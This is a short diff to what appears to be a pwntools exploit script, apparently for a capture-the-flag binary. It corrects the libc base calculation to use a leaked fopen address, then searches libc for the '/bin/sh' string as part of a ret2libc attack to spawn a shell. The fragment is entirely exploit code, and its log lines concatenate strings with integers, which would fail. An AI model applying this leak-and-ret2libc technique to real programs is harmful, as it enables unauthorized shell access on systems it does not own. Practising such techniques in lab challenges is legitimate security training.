@@ -30,7 +30,7 @@ leak = r.recv()
 fopen_leak = u64(leak[:6].ljust(8, b"\x00"))
 log.info('fopen_leak: ' + fopen_leak)
 
-libc_base = libc_leak - libc.symbols['fopen']
+libc_base = fopen_leak - libc.symbols['fopen']
 log.info('libc_base: ' + libc_base)
 
 bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
